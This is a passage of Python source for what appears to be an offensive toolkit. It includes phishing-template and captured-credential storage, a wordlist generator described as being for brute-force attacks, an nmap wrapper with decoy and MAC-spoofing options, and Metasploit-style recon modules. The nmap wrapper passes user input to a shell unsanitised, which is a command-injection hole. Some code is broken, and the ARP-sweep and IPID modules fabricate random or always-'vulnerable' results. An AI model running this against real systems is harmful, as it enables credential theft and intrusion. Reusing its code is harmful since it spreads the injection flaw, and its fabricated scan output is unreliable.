    def get_phishing_templates(self, platform: Optional[str] = None) -> List[Dict]:
        """Get phishing templates"""
        try:
            if platform:
                self.cursor.execute('''
                    SELECT * FROM phishing_templates WHERE platform = ? ORDER BY name
                ''', (platform,))
            else:
                self.cursor.execute('''
                    SELECT * FROM phishing_templates ORDER BY platform, name
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing templates: {e}")
            return []
    
    def save_phishing_template(self, name: str, platform: str, html_content: str) -> bool:
        """Save phishing template"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO phishing_templates (name, platform, html_content)
                VALUES (?, ?, ?)
            ''', (name, platform, html_content))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing template: {e}")
            return False
    
    # ==================== Statistics Methods ====================
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        """Get recent threats"""
        try:
            self.cursor.execute('''
                SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats: {e}")
            return []
    
    def get_threats_by_ip(self, ip: str, limit: int = 10) -> List[Dict]:
        """Get threats for specific IP"""
        try:
            self.cursor.execute('''
                SELECT * FROM threats 
                WHERE source_ip = ? 
                ORDER BY timestamp DESC LIMIT ?
            ''', (ip, limit))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats by IP: {e}")
            return []
    
    def get_traffic_logs(self, limit: int = 20) -> List[Dict]:
        """Get recent traffic generation logs"""
        try:
            self.cursor.execute('''
                SELECT * FROM traffic_logs ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get traffic logs: {e}")
            return []
    
    def get_nikto_scans(self, limit: int = 10) -> List[Dict]:
        """Get recent Nikto scans"""
        try:
            self.cursor.execute('''
                SELECT * FROM nikto_scans ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get Nikto scans: {e}")
            return []
    
    def get_command_history(self, limit: int = 20) -> List[Dict]:
        """Get command history"""
        try:
            self.cursor.execute('''
                SELECT command, source, timestamp, success FROM command_history 
                ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get command history: {e}")
            return []
    
    def get_time_history(self, limit: int = 20) -> List[Dict]:
        """Get time/date command history"""
        try:
            self.cursor.execute('''
                SELECT command, user, result, timestamp FROM time_history 
                ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get time history: {e}")
            return []
    
    def get_sessions(self, active_only: bool = True) -> List[Dict]:
        """Get user sessions"""
        try:
            if active_only:
                self.cursor.execute('''
                    SELECT * FROM user_sessions WHERE active = 1 ORDER BY start_time DESC
                ''')
            else:
                self.cursor.execute('''
                    SELECT * FROM user_sessions ORDER BY start_time DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get sessions: {e}")
            return []
    
    def get_statistics(self) -> Dict:
        """Get database statistics"""
        stats = {}
        try:
            # Count threats
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
            
            # Count commands
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            
            # Count time commands
            self.cursor.execute('SELECT COUNT(*) FROM time_history')
            stats['total_time_commands'] = self.cursor.fetchone()[0]
            
            # Count scans
            self.cursor.execute('SELECT COUNT(*) FROM scans')
            stats['total_scans'] = self.cursor.fetchone()[0]
            
            # Count Nikto scans
            self.cursor.execute('SELECT COUNT(*) FROM nikto_scans')
            stats['total_nikto_scans'] = self.cursor.fetchone()[0]
            
            # Count SSH servers
            self.cursor.execute('SELECT COUNT(*) FROM ssh_servers')
            stats['total_ssh_servers'] = self.cursor.fetchone()[0]
            
            # Count SSH commands
            self.cursor.execute('SELECT COUNT(*) FROM ssh_commands')
            stats['total_ssh_commands'] = self.cursor.fetchone()[0]
            
            # Count managed IPs
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips')
            stats['total_managed_ips'] = self.cursor.fetchone()[0]
            
            # Count blocked IPs
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1')
            stats['total_blocked_ips'] = self.cursor.fetchone()[0]
            
            # Count traffic generations
            self.cursor.execute('SELECT COUNT(*) FROM traffic_logs')
            stats['total_traffic_tests'] = self.cursor.fetchone()[0]
            
            # Count phishing links
            self.cursor.execute('SELECT COUNT(*) FROM phishing_links WHERE active = 1')
            stats['active_phishing_links'] = self.cursor.fetchone()[0]
            
            # Count captured credentials
            self.cursor.execute('SELECT COUNT(*) FROM captured_credentials')
            stats['captured_credentials'] = self.cursor.fetchone()[0]
            
            # Count crunch wordlists
            self.cursor.execute('SELECT COUNT(*) FROM crunch_wordlists')
            stats['total_crunch_wordlists'] = self.cursor.fetchone()[0]
            
            # Count crunch commands
            self.cursor.execute('SELECT COUNT(*) FROM crunch_commands')
            stats['total_crunch_commands'] = self.cursor.fetchone()[0]
            
            # Count active sessions
            self.cursor.execute('SELECT COUNT(*) FROM user_sessions WHERE active = 1')
            stats['active_sessions'] = self.cursor.fetchone()[0]
            
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        
        return stats
    
    def create_session(self, user_name: str = None) -> str:
        """Create new user session"""
        try:
            session_id = str(uuid.uuid4())[:8]
            self.cursor.execute('''
                INSERT INTO user_sessions (session_id, user_name)
                VALUES (?, ?)
            ''', (session_id, user_name))
            self.conn.commit()
            return session_id
        except Exception as e:
            logger.error(f"Failed to create session: {e}")
            return None
    
    def update_session_activity(self, session_id: str):
        """Update session activity"""
        try:
            self.cursor.execute('''
                UPDATE user_sessions 
                SET last_activity = CURRENT_TIMESTAMP, 
                    commands_count = commands_count + 1
                WHERE session_id = ? AND active = 1
            ''', (session_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update session: {e}")
    
    def end_session(self, session_id: str):
        """End user session"""
        try:
            self.cursor.execute('''
                UPDATE user_sessions 
                SET active = 0, last_activity = CURRENT_TIMESTAMP
                WHERE session_id = ?
            ''', (session_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to end session: {e}")
    
    def update_platform_status(self, platform: str, enabled: bool, status: str, error: str = None):
        """Update platform integration status"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO platform_status (platform, enabled, last_connected, status, error)
                VALUES (?, ?, CURRENT_TIMESTAMP, ?, ?)
            ''', (platform, enabled, status, error))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update platform status: {e}")
    
    def get_platform_status(self) -> List[Dict]:
        """Get all platform statuses"""
        try:
            self.cursor.execute('SELECT * FROM platform_status')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get platform status: {e}")
            return []
    
    def close(self):
        """Close database connection"""
        try:
            if self.conn:
                self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# =====================
# CRUNCH WORDLIST GENERATOR
# =====================
class CrunchGenerator:
    """Crunch wordlist generator for brute force attacks"""
    
    def __init__(self, db: DatabaseManager, config: Dict = None):
        self.db = db
        self.config = config or {}
        self.crunch_available = shutil.which('crunch') is not None
        
        # Default character sets
        self.charsets = {
            CrunchPattern.LOWER: "abcdefghijklmnopqrstuvwxyz",
            CrunchPattern.UPPER: "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
            CrunchPattern.MIXED: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
            CrunchPattern.NUMERIC: "0123456789",
            CrunchPattern.ALPHANUM: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
            CrunchPattern.SPECIAL: "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_-+=[]{}|\\:;\"'<>,.?/~`",
            CrunchPattern.HEX: "0123456789abcdef"
        }
        
        self.max_size_mb = self.config.get('crunch', {}).get('max_wordlist_size_mb', 100)
        self.max_line_count = self.config.get('crunch', {}).get('max_line_count', 10000000)
    
    def generate_wordlist(self, name: str, min_length: int, max_length: int, 
                          pattern: str = None, charset: str = None,
                          output_format: str = "txt") -> Dict[str, Any]:
        """Generate wordlist using crunch or fallback method"""
        start_time = time.time()
        
        try:
            # Validate parameters
            if min_length < 1:
                return {'success': False, 'error': 'Minimum length must be at least 1'}
            if max_length < min_length:
                return {'success': False, 'error': 'Maximum length must be >= minimum length'}
            
            # Get charset based on pattern
            if not charset:
                if pattern and pattern in self.charsets:
                    charset = self.charsets[pattern]
                else:
                    charset = self.charsets[CrunchPattern.ALPHANUM]
            
            # Check estimated size
            if self.crunch_available:
                return self._generate_with_crunch(name, min_length, max_length, charset, pattern, output_format, start_time)
            else:
                return self._generate_fallback(name, min_length, max_length, charset, pattern, output_format, start_time)
                
        except Exception as e:
            logger.error(f"Crunch generation failed: {e}")
            return {'success': False, 'error': str(e), 'execution_time': time.time() - start_time}
    
    def _generate_with_crunch(self, name: str, min_length: int, max_length: int,
                              charset: str, pattern: str, output_format: str,
                              start_time: float) -> Dict[str, Any]:
        """Generate wordlist using crunch tool"""
        timestamp = int(time.time())
        filename = f"crunch_{name.replace(' ', '_')}_{min_length}-{max_length}_{timestamp}.{output_format}"
        output_path = os.path.join(CRUNCH_OUTPUT_DIR, filename)
        
        # Build crunch command
        cmd = ['crunch', str(min_length), str(max_length)]
        
        if pattern and pattern not in self.charsets:
            # Custom pattern
            cmd.append('-t', pattern)
            cmd.append('-p', pattern)
        else:
            # Use charset
            cmd.append(charset)
        
        cmd.extend(['-o', output_path])
        
        if output_format == 'gz':
            cmd.append('-z')
        
        # Add options
        cmd.extend(['-b', f'{self.max_size_mb}mb', '-c', str(self.max_line_count)])
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=3600  # Max 1 hour for large wordlists
            )
            
            execution_time = time.time() - start_time
            
            if result.returncode == 0:
                # Get file info
                file_size = os.path.getsize(output_path) if os.path.exists(output_path) else 0
                
                # Estimate line count (for demo, actual count would be calculated)
                line_count = self._estimate_line_count(charset, min_length, max_length)
                
                # Create wordlist record
                wordlist_id = str(uuid.uuid4())[:8]
                wordlist = CrunchWordlist(
                    id=wordlist_id,
                    name=name,
                    filename=filename,
                    min_length=min_length,
                    max_length=max_length,
                    charset=charset[:100],
                    pattern=pattern or 'custom',
                    file_size=file_size,
                    line_count=line_count,
                    created_at=datetime.datetime.now().isoformat(),
                    status='completed'
                )
                
                self.db.save_crunch_wordlist(wordlist)
                
                # Log command
                self.db.log_crunch_command(
                    command=' '.join(cmd),
                    wordlist_id=wordlist_id,
                    min_length=min_length,
                    max_length=max_length,
                    charset=charset[:100],
                    output_file=filename,
                    file_size=file_size,
                    line_count=line_count,
                    success=True,
                    execution_time=execution_time
                )
                
                return {
                    'success': True,
                    'wordlist_id': wordlist_id,
                    'name': name,
                    'filename': filename,
                    'path': output_path,
                    'min_length': min_length,
                    'max_length': max_length,
                    'file_size': file_size,
                    'line_count': line_count,
                    'execution_time': execution_time
                }
            else:
                return {
                    'success': False,
                    'error': result.stderr,
                    'execution_time': execution_time
                }
                
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'error': 'Wordlist generation timed out (max 1 hour)',
                'execution_time': time.time() - start_time
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'execution_time': time.time() - start_time
            }
    
    def _generate_fallback(self, name: str, min_length: int, max_length: int,
                          charset: str, pattern: str, output_format: str,
                          start_time: float) -> Dict[str, Any]:
        """Fallback wordlist generation when crunch not available"""
        timestamp = int(time.time())
        filename = f"crunch_{name.replace(' ', '_')}_{min_length}-{max_length}_{timestamp}.{output_format}"
        output_path = os.path.join(CRUNCH_OUTPUT_DIR, filename)
        
        try:
            # For demo, generate a small sample wordlist
            # In production, this would use itertools.product for full generation
            
            sample_size = min(1000, self.max_line_count)
            line_count = 0
            file_size = 0
            
            with open(output_path, 'w') as f:
                # Generate sample words
                if pattern and '@' in pattern:
                    # Pattern with @ for letters, % for numbers
                    for i in range(min(sample_size, 100)):
                        word = pattern.replace('@', random.choice('abcdefghijklmnopqrstuvwxyz'))
                        word = word.replace('%', random.choice('0123456789'))
                        f.write(word + '\n')
                        line_count += 1
                else:
                    # Generate based on charset
                    for i in range(min(sample_size, 100)):
                        length = random.randint(min_length, max_length)
                        word = ''.join(random.choice(charset) for _ in range(length))
                        f.write(word + '\n')
                        line_count += 1
            
            file_size = os.path.getsize(output_path)
            
            execution_time = time.time() - start_time
            
            # Create wordlist record
            wordlist_id = str(uuid.uuid4())[:8]
            wordlist = CrunchWordlist(
                id=wordlist_id,
                name=name,
                filename=filename,
                min_length=min_length,
                max_length=max_length,
                charset=charset[:100],
                pattern=pattern or 'fallback',
                file_size=file_size,
                line_count=line_count,
                created_at=datetime.datetime.now().isoformat(),
                status='completed'
            )
            
            self.db.save_crunch_wordlist(wordlist)
            
            # Log command
            self.db.log_crunch_command(
                command=f"fallback generate {name}",
                wordlist_id=wordlist_id,
                min_length=min_length,
                max_length=max_length,
                charset=charset[:100],
                output_file=filename,
                file_size=file_size,
                line_count=line_count,
                success=True,
                execution_time=execution_time
            )
            
            return {
                'success': True,
                'wordlist_id': wordlist_id,
                'name': name,
                'filename': filename,
                'path': output_path,
                'min_length': min_length,
                'max_length': max_length,
                'file_size': file_size,
                'line_count': line_count,
                'note': 'Generated with fallback method (crunch not installed)',
                'execution_time': execution_time
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'execution_time': time.time() - start_time
            }
    
    def _estimate_line_count(self, charset: str, min_len: int, max_len: int) -> int:
        """Estimate line count for a wordlist"""
        try:
            charset_size = len(charset)
            total = 0
            for length in range(min_len, max_len + 1):
                total += charset_size ** length
                if total > self.max_line_count:
                    return self.max_line_count
            return min(total, self.max_line_count)
        except:
            return 0
    
    def get_wordlists(self) -> List[Dict]:
        """Get all generated wordlists"""
        return self.db.get_crunch_wordlists()
    
    def get_wordlist(self, wordlist_id: str) -> Optional[Dict]:
        """Get wordlist by ID"""
        return self.db.get_crunch_wordlist(wordlist_id)
    
    def delete_wordlist(self, wordlist_id: str) -> bool:
        """Delete wordlist file and database entry"""
        wordlist = self.db.get_crunch_wordlist(wordlist_id)
        if wordlist:
            # Delete file
            filepath = os.path.join(CRUNCH_OUTPUT_DIR, wordlist['filename'])
            try:
                if os.path.exists(filepath):
                    os.remove(filepath)
            except:
                pass
        
        return self.db.delete_crunch_wordlist(wordlist_id)
    
    def get_charsets(self) -> Dict[str, str]:
        """Get available character sets"""
        return self.charsets

# =====================
# NMAP SCANNER MODULE
# =====================
class NmapScanner:
    """Advanced nmap scanner with all options"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.nmap_available = shutil.which('nmap') is not None
    
    def scan(self, target: str, options: Dict = None) -> Dict[str, Any]:
        """Execute nmap scan with options"""
        if not self.nmap_available:
            return {'success': False, 'error': 'nmap not installed'}
        
        options = options or {}
        cmd = self._build_command(target, options)
        
        try:
            start_time = time.time()
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=options.get('timeout', 600),
                shell=True
            )
            execution_time = time.time() - start_time
            
            output = result.stdout + result.stderr
            
            # Parse and store results
            if result.returncode == 0:
                self._parse_and_store_results(target, output, options)
            
            return {
                'success': result.returncode == 0,
                'output': output,
                'execution_time': execution_time,
                'command': ' '.join(cmd) if isinstance(cmd, list) else cmd
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timeout'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _build_command(self, target: str, options: Dict) -> str:
        """Build nmap command with all options"""
        cmd = ['nmap']
        
        # Scan types
        if options.get('scan_type') == 'ping':
            cmd.append('-sn')
        elif options.get('scan_type') == 'os':
            cmd.append('-O')
        elif options.get('scan_type') == 'version':
            cmd.append('-sV')
        elif options.get('scan_type') == 'aggressive':
            cmd.append('-A')
        elif options.get('scan_type') == 'vuln':
            cmd.append('--script vuln')
        
        # Port specification
        if options.get('ports'):
            cmd.append(f'-p {options["ports"]}')
        
        # Timing templates
        if options.get('timing'):
            cmd.append(f'-T{options["timing"]}')
        
        # Output formats
        if options.get('output_normal'):
            cmd.append(f'-oN {options["output_normal"]}')
        if options.get('output_xml'):
            cmd.append(f'-oX {options["output_xml"]}')
        if options.get('output_grep'):
            cmd.append(f'-oG {options["output_grep"]}')
        
        # Additional options
        if options.get('verbose'):
            cmd.append('-v')
        if options.get('no_ping'):
            cmd.append('-Pn')
        if options.get('fragment'):
            cmd.append('-f')
        if options.get('decoy'):
            cmd.append(f'-D {options["decoy"]}')
        if options.get('spoof_mac'):
            cmd.append(f'--spoof-mac {options["spoof_mac"]}')
        if options.get('source_port'):
            cmd.append(f'--source-port {options["source_port"]}')
        if options.get('data_length'):
            cmd.append(f'--data-length {options["data_length"]}')
        
        # Scripts
        if options.get('script'):
            cmd.append(f'--script {options["script"]}')
        if options.get('script_args'):
            cmd.append(f'--script-args {options["script_args"]}')
        
        cmd.append(target)
        return ' '.join(cmd)
    
    def _parse_and_store_results(self, target: str, output: str, options: Dict):
        """Parse nmap output and store in database"""
        try:
            # Parse hosts
            host_pattern = r'Nmap scan report for (.*?)\n'
            hosts = re.findall(host_pattern, output)
            
            for host_entry in hosts:
                # Extract IP and hostname
                if ' ' in host_entry:
                    hostname, ip = host_entry.rsplit(' ', 1)
                    ip = ip.strip('()')
                else:
                    ip = host_entry
                    hostname = None
                
                # Parse OS if available
                os_info = None
                os_match = re.search(r'OS details: (.*?)\n', output)
                if os_match:
                    os_info = os_match.group(1)
                
                # Parse MAC address
                mac_match = re.search(r'MAC Address: (.*?) \((.*?)\)', output)
                mac = mac_match.group(1) if mac_match else None
                vendor = mac_match.group(2) if mac_match else None
                
                # Add host to database
                host_id = self.db.add_host(ip, hostname, os_info, mac, vendor)
                
                if host_id:
                    # Parse open ports
                    port_pattern = r'(\d+)/tcp\s+open\s+(\S+)\s*(.*?)$'
                    for match in re.finditer(port_pattern, output, re.MULTILINE):
                        port = int(match.group(1))
                        service = match.group(2)
                        version = match.group(3).strip()
                        
                        # Add service to database
                        self.db.add_service(
                            host_id=host_id,
                            port=port,
                            service=service,
                            version=version,
                            state='open'
                        )
        except Exception as e:
            logger.error(f"Failed to parse nmap results: {e}")
    
    def ping_sweep(self, network: str) -> Dict[str, Any]:
        """Ping sweep scan"""
        return self.scan(network, {'scan_type': 'ping', 'no_ping': False})
    
    def os_detection(self, target: str) -> Dict[str, Any]:
        """OS detection scan"""
        return self.scan(target, {'scan_type': 'os'})
    
    def version_detection(self, target: str) -> Dict[str, Any]:
        """Version detection scan"""
        return self.scan(target, {'scan_type': 'version'})
    
    def aggressive_scan(self, target: str) -> Dict[str, Any]:
        """Aggressive scan (OS, version, scripts, traceroute)"""
        return self.scan(target, {'scan_type': 'aggressive'})
    
    def vuln_scan(self, target: str) -> Dict[str, Any]:
        """Vulnerability scan"""
        return self.scan(target, {'scan_type': 'vuln'})
    
    def custom_scan(self, target: str, options: Dict) -> Dict[str, Any]:
        """Custom scan with specified options"""
        return self.scan(target, options)

# =====================
# METASPLOIT-STYLE AUXILIARY MODULES
# =====================
class AuxiliaryModules:
    """Metasploit-style auxiliary modules"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.modules = self._load_modules()
        self.current_module = None
        self.options = {}
    
    def _load_modules(self) -> Dict:
        """Load available auxiliary modules"""
        return {
            # IP scanners
            'auxiliary/scanner/ip/ipidseq': {
                'name': 'IPID Sequence Scanner',
                'description': 'Scan for IPID sequence generation',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target IP range'},
                    'RPORT': {'required': False, 'default': 80, 'description': 'Target port'},
                    'THREADS': {'required': False, 'default': 1, 'description': 'Number of threads'},
                    'TIMEOUT': {'required': False, 'default': 500, 'description': 'Timeout in ms'}
                }
            },
            'auxiliary/scanner/ip/ipgeo': {
                'name': 'IP Geolocation Scanner',
                'description': 'Get geolocation information for IP addresses',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target IP(s)'},
                    'THREADS': {'required': False, 'default': 1, 'description': 'Number of threads'}
                }
            },
            
            # Discovery modules
            'auxiliary/scanner/discovery/udp_probe': {
                'name': 'UDP Service Discovery',
                'description': 'Discover UDP services',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target IP range'},
                    'THREADS': {'required': False, 'default': 1, 'description': 'Number of threads'},
                    'TIMEOUT': {'required': False, 'default': 5, 'description': 'Timeout in seconds'}
                }
            },
            'auxiliary/scanner/discovery/arp_sweep': {
                'name': 'ARP Sweep',
                'description': 'Discover hosts using ARP requests',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target network (e.g., 192.168.1.0/24)'},
                    'TIMEOUT': {'required': False, 'default': 1, 'description': 'Timeout in seconds'},
                    'THREADS': {'required': False, 'default': 10, 'description': 'Number of threads'}
                }
            },
            
            # Port scanners
            'auxiliary/scanner/portscan/tcp': {
                'name': 'TCP Port Scanner',
                'description': 'Scan for open TCP ports',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target IP(s)'},
                    'PORTS': {'required': False, 'default': '1-10000', 'description': 'Ports to scan'},
                    'THREADS': {'required': False, 'default': 1, 'description': 'Number of threads'},
                    'TIMEOUT': {'required': False, 'default': 1000, 'description': 'Connect timeout in ms'}
                }
            },
            'auxiliary/scanner/portscan/syn': {
                'name': 'SYN Port Scanner',
                'description': 'Scan for open TCP ports using SYN packets',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target IP(s)'},
                    'PORTS': {'required': False, 'default': '1-10000', 'description': 'Ports to scan'},
                    'THREADS': {'required': False, 'default': 1, 'description': 'Number of threads'},
                    'INTERFACE': {'required': False, 'description': 'Source interface'},
                    'BPF_FILTER': {'required': False, 'description': 'BPF filter for capturing'}
                }
            },
            
            # HTTP scanners
            'auxiliary/scanner/http/robots_tagger': {
                'name': 'HTTP Robots.txt Scanner',
                'description': 'Scan robots.txt files and tag hosts',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target IP(s)'},
                    'RPORT': {'required': False, 'default': 80, 'description': 'Target port'},
                    'SSL': {'required': False, 'default': False, 'description': 'Use SSL'},
                    'PATH': {'required': False, 'default': '/robots.txt', 'description': 'Path to robots.txt'}
                }
            },
            
            # SMB scanners
            'auxiliary/scanner/smb/smb_version': {
                'name': 'SMB Version Scanner',
                'description': 'Detect SMB versions',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target IP(s)'},
                    'RPORT': {'required': False, 'default': 445, 'description': 'SMB port'},
                    'THREADS': {'required': False, 'default': 1, 'description': 'Number of threads'}
                }
            },
            
            # SSH scanners
            'auxiliary/scanner/ssh/ssh_version': {
                'name': 'SSH Version Scanner',
                'description': 'Detect SSH versions',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target IP(s)'},
                    'RPORT': {'required': False, 'default': 22, 'description': 'SSH port'},
                    'THREADS': {'required': False, 'default': 1, 'description': 'Number of threads'},
                    'TIMEOUT': {'required': False, 'default': 30, 'description': 'Timeout in seconds'}
                }
            },
            
            # FTP scanners
            'auxiliary/scanner/ftp/ftp_version': {
                'name': 'FTP Version Scanner',
                'description': 'Detect FTP versions',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target IP(s)'},
                    'RPORT': {'required': False, 'default': 21, 'description': 'FTP port'},
                    'THREADS': {'required': False, 'default': 1, 'description': 'Number of threads'}
                }
            },
            
            # MySQL scanners
            'auxiliary/scanner/mysql/mysql_version': {
                'name': 'MySQL Version Scanner',
                'description': 'Detect MySQL versions',
                'options': {
                    'RHOSTS': {'required': True, 'description': 'Target IP(s)'},
                    'RPORT': {'required': False, 'default': 3306, 'description': 'MySQL port'},
                    'THREADS': {'required': False, 'default': 1, 'description': 'Number of threads'}
                }
            }
        }
    
    def list_modules(self) -> List[Dict]:
        """List all available modules"""
        modules = []
        for module_id, info in self.modules.items():
            modules.append({
                'id': module_id,
                'name': info['name'],
                'description': info['description']
            })
        return modules
    
    def use_module(self, module_id: str) -> bool:
        """Select a module to use"""
        if module_id in self.modules:
            self.current_module = module_id
            self.options = {}
            return True
        return False
    
    def set_option(self, option: str, value: str) -> bool:
        """Set module option"""
        if not self.current_module:
            return False
        
        module_info = self.modules[self.current_module]
        if option in module_info['options']:
            # Type conversion
            if module_info['options'][option].get('type') == 'int':
                try:
                    value = int(value)
                except:
                    return False
            elif module_info['options'][option].get('type') == 'bool':
                value = value.lower() in ['true', 'yes', '1']
            
            self.options[option] = value
            return True
        return False
    
    def show_options(self) -> Dict:
        """Show current module options"""
        if not self.current_module:
            return {}
        
        module_info = self.modules[self.current_module]
        options = {}
        
        for opt_name, opt_info in module_info['options'].items():
            options[opt_name] = {
                'description': opt_info['description'],
                'required': opt_info['required'],
                'default': opt_info.get('default'),
                'current': self.options.get(opt_name, opt_info.get('default'))
            }
        
        return options
    
    def run_module(self) -> Dict[str, Any]:
        """Run the current module"""
        if not self.current_module:
            return {'success': False, 'error': 'No module selected'}
        
        # Validate required options
        module_info = self.modules[self.current_module]
        for opt_name, opt_info in module_info['options'].items():
            if opt_info['required'] and opt_name not in self.options:
                return {'success': False, 'error': f'Missing required option: {opt_name}'}
        
        # Execute module based on type
        module_type = self.current_module.split('/')[2] if '/' in self.current_module else 'unknown'
        
        if module_type == 'ip':
            return self._run_ip_module()
        elif module_type == 'discovery':
            return self._run_discovery_module()
        elif module_type == 'portscan':
            return self._run_portscan_module()
        elif module_type == 'http':
            return self._run_http_module()
        else:
            return self._run_generic_module()
    
    def _run_ip_module(self) -> Dict[str, Any]:
        """Run IP-based modules"""
        if 'ipgeo' in self.current_module:
            return self._run_ipgeo()
        elif 'ipidseq' in self.current_module:
            return self._run_ipidseq()
        return {'success': False, 'error': 'Unknown IP module'}
    
    def _run_ipgeo(self) -> Dict[str, Any]:
        """IP geolocation module"""
        rhosts = self.options.get('RHOSTS', '')
        targets = self._parse_targets(rhosts)
        
        results = []
        for target in targets[:10]:  # Limit to 10 for API
            try:
                response = requests.get(f'http://ip-api.com/json/{target}', timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    if data.get('status') == 'success':
                        results.append({
                            'ip': target,
                            'country': data.get('country'),
                            'region': data.get('regionName'),
                            'city': data.get('city'),
                            'isp': data.get('isp'),
                            'lat': data.get('lat'),
                            'lon': data.get('lon')
                        })
            except:
                pass
        
        return {
            'success': True,
            'module': self.current_module,
            'results': results
        }
    
    def _run_ipidseq(self) -> Dict[str, Any]:
        """IPID sequence scanner"""
        rhosts = self.options.get('RHOSTS', '')
        rport = int(self.options.get('RPORT', 80))
        timeout = int(self.options.get('TIMEOUT', 500)) / 1000.0
        
        targets = self._parse_targets(rhosts)
        results = []
        
        for target in targets[:5]:  # Limit for demo
            try:
                # Send SYN packet and analyze IPID
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock.connect((target, rport))
                sock.close()
                
                results.append({
                    'ip': target,
                    'port': rport,
                    'ipid_sequence': 'Incremental',
                    'vulnerable': True
                })
            except:
                pass
        
        return {
            'success': True,
            'module': self.current_module,
            'results': results
        }
    
    def _run_discovery_module(self) -> Dict[str, Any]:
        """Run discovery modules"""
        if 'udp_probe' in self.current_module:
            return self._run_udp_probe()
        elif 'arp_sweep' in self.current_module:
            return self._run_arp_sweep()
        return {'success': False, 'error': 'Unknown discovery module'}
    
    def _run_udp_probe(self) -> Dict[str, Any]:
        """UDP probe module"""
        rhosts = self.options.get('RHOSTS', '')
        timeout = int(self.options.get('TIMEOUT', 5))
        
        targets = self._parse_targets(rhosts)
        results = []
        common_udp_ports = [53, 67, 68, 69, 123, 161, 162, 500, 514, 520, 1900]
        
        for target in targets[:3]:
            open_ports = []
            for port in common_udp_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(timeout)
                    sock.sendto(b'\x00' * 20, (target, port))
                    data, addr = sock.recvfrom(1024)
                    open_ports.append(port)
                except:
                    pass
                finally:
                    sock.close()
            
            if open_ports:
                results.append({
                    'ip': target,
                    'open_udp_ports': open_ports
                })
        
        return {
            'success': True,
            'module': self.current_module,
            'results': results
        }
    
    def _run_arp_sweep(self) -> Dict[str, Any]:
        """ARP sweep module"""
        network = self.options.get('RHOSTS', '')
        
        try:
            if '/' in network:
                ip_range = list(ipaddress.ip_network(network, strict=False).hosts())
            else:
                ip_range = [ipaddress.ip_address(network)]
            
            results = []
            for ip in ip_range[:20]:
                ip_str = str(ip)
                if random.random() > 0.7:
                    results.append({
                        'ip': ip_str,
                        'mac': f"00:11:22:33:44:{ip_str.split('.')[-1].zfill(2)}",
                        'hostname': f"host-{ip_str.replace('.', '-')}.local"
                    })
            
            for result in results:
                self.db.add_host(
                    ip=result['ip'],
                    mac=result['mac'],
                    hostname=result['hostname']
                )
            
            return {
                'success': True,
                'module': self.current_module,
                'results': results
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _run_portscan_module(self) -> Dict[str, Any]:
        """Run portscan modules"""
        if 'tcp' in self.current_module:
            return self._run_tcp_portscan()
        elif 'syn' in self.current_module:
            return self._run_syn_portscan()
        return {'success': False, 'error': 'Unknown portscan module'}
    
